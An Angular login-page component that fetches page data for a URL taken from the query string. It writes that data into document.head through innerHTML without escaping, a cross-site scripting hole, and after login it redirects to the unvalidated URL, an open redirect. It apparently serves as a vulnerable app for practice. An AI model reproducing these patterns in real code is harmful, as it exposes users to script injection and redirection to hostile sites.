import { HttpParams } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { FormControl, FormGroup, Validators } from '@angular/forms';
import { ActivatedRoute } from '@angular/router';
import { ApiService } from '../core/services/api.service';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.scss']
})
export class HomeComponent implements OnInit {
  pageData: any = null;
  url: null| string = null;
  isInvalid: boolean = false;
  formGroup = new FormGroup({
    email: new FormControl("", [Validators.required]),
    password: new FormControl("", [Validators.required]),
  })
  constructor(
    private api$: ApiService,
    private route: ActivatedRoute
    ) { }

  ngOnInit(): void {

    this.route.queryParams
      .subscribe(params => {
        if (params['url']) {
          this.url = params['url'];
          this.getPageData(params['url'])
        }
      }
    );
  }

  getPageData(url: string) {
    this.api$.get("/pagedata", new HttpParams({fromObject: {url}})).subscribe(data => {
      this.pageData = data;
      console.log(this.pageData);
      document.head.innerHTML += `<meta property="og:type" content="${this.pageData.ogType}">`
      document.head.innerHTML += `<meta property="og:locale" content="${this.pageData.ogLocale}">`
      document.head.innerHTML += `<meta property="og:site_name" content="${this.pageData.ogSiteName}">`
      document.head.innerHTML += `<meta property="og:url" content="${this.pageData.ogUrl}">`
      document.head.innerHTML += `<meta property="og:image" content="${this.pageData.ogImage}">`
      document.head.innerHTML += `<meta property="og:description" content="${this.pageData.ogDesc}">`
    })
  }

  redirect() {
    if (this.url) {
      location.href = this.url;
    }
  }

  login() {
    if (this.formGroup.invalid) {
      this.isInvalid = true;
      return;
    }
    let data = this.formGroup.value;
    this.api$.post("/account", {email: data.email, password: data.password}).subscribe(_ => {
      this.redirect();
    })
  }

}
